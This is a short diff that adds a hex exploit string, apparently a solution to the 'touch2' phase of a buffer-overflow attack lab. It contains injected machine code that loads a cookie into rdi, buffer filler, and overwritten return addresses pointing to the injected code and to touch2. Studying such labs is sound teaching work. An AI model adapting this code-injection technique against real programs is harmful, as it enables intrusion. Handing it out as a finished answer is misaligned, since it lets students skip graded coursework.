@@ -1,0 +1,5 @@
+48 c7 c7 73 23 32 42 c3 /* injected code (mov $0x{cookie}, $rdi \n ret) */
+2a 2a 2a 2a 2a 2a 2a 2a /* buffer filler */
+2a 2a 2a 2a 2a 2a 2a 2a
+08 65 63 55 00 00 00 00 /* address of injected code */
+a9 18 40 00 00 00 00 00 /* touch2 address */
